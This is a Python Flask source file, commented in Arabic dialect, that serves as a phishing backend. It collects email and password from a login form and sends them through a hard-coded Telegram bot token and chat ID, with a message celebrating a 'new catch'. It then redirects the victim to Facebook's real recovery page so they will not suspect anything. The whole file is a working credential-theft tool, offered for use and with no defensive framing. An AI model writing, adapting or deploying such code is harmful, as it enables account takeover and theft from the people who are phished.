import os
from flask import Flask, render_template, request, redirect
import requests

app = Flask(__name__)

# --- إعدادات التلغرام (تأكد من معلوماتك) ---
BOT_TOKEN = "7547614066:AAH3_M0L5v0uM0_u3Ym0-u9Z" 
CHAT_ID = "5304381534" 

@app.route('/')
def index():
    # هذا السطر يفتح صفحة الـ HTML اللي خدمناها
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    # سحب المعلومات من الفورم (Email و Password)
    email = request.form.get('email')
    password = request.form.get('password')
    
    # تنسيق الرسالة اللي توصلك للتلغرام
    message = (
        "🎯 صيدة جديدة يا فارس! 🎯\n"
        "--------------------------\n"
        f"📧 الإيميل: {email}\n"
        f"🔑 الباسورد: {password}\n"
        "--------------------------\n"
        "📱 تم الاصطياد بنجاح ✅"
    )
    
    # إرسال الرسالة عبر Bot التلغرام
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        params = {"chat_id": CHAT_ID, "text": message}
        requests.get(url, params=params)
    except Exception as e:
        print(f"Error sending to Telegram: {e}")

    # توجيه الضحية لصفحة فيسبوك الحقيقية باش ما يشك في والو
    return redirect("https://www.facebook.com/recover/checkpoint/")

if __name__ == '__main__':
    # هاد السطر مهم بزاف لـ Render باش يعرف البورت (10000)
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
